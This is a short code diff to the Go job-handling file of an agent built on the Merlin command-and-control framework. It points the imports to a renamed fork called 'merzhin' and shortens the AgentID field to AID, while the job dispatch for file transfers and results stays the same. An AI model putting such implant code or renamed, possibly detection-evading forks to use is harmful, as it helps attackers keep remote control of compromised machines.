@@ -23,12 +23,12 @@ import (
 	"strings"
 
 	// Merlin Main
-	"github.com/Ne0nd0g/merlin/pkg/jobs"
-	"github.com/Ne0nd0g/merlin/pkg/messages"
+	"github.com/testtoto1337/merzhin/pkg/jobs"
+	"github.com/testtoto1337/merzhin/pkg/messages"
 
 	// Internal
-	"github.com/Ne0nd0g/merlin-agent/cli"
-	"github.com/Ne0nd0g/merlin-agent/commands"
+	"github.com/testtoto1337/merzhin-agent/cli"
+	"github.com/testtoto1337/merzhin-agent/commands"
 )
 
 var jobsIn = make(chan jobs.Job, 100)  // A channel of input jobs for the agent to handle
@@ -58,7 +58,7 @@ func executeJob() {
 						result.Stderr = err.Error()
 					}
 					jobsOut <- jobs.Job{
-						AgentID: job.AgentID,
+						AID: job.AID,
 						ID:      job.ID,
 						Token:   job.Token,
 						Type:    jobs.FILETRANSFER,
@@ -81,7 +81,7 @@ func executeJob() {
 						result.Stderr = err.Error()
 					}
 					jobsOut <- jobs.Job{
-						AgentID: job.AgentID,
+						AID: job.AID,
 						ID:      job.ID,
 						Token:   job.Token,
 						Type:    jobs.FILETRANSFER,
@@ -112,7 +112,7 @@ func executeJob() {
 				result.Stderr = fmt.Sprintf("Invalid job type: %d", job.Type)
 			}
 			jobsOut <- jobs.Job{
-				AgentID: job.AgentID,
+				AID: job.AID,
 				ID:      job.ID,
 				Token:   job.Token,
 				Type:    jobs.RESULT,
@@ -156,7 +156,7 @@ func (a *Agent) jobHandler(Jobs []jobs.Job) {
 	cli.Message(cli.DEBUG, "Entering into agent.jobHandler() function")
 	for _, job := range Jobs {
 		// If the job belongs to this agent
-		if job.AgentID == a.ID {
+		if job.AID == a.ID {
 			cli.Message(cli.SUCCESS, fmt.Sprintf("%s job type received!", jobs.String(job.Type)))
 			switch job.Type {
 			case jobs.FILETRANSFER:
@@ -182,7 +182,7 @@ func (a *Agent) jobHandler(Jobs []jobs.Job) {
 				result.Stderr = fmt.Sprintf("%s is not a valid job type", messages.String(job.Type))
 				jobsOut <- jobs.Job{
 					ID:      job.ID,
-					AgentID: a.ID,
+					AID: a.ID,
 					Token:   job.Token,
 					Type:    jobs.RESULT,
 					Payload: result,
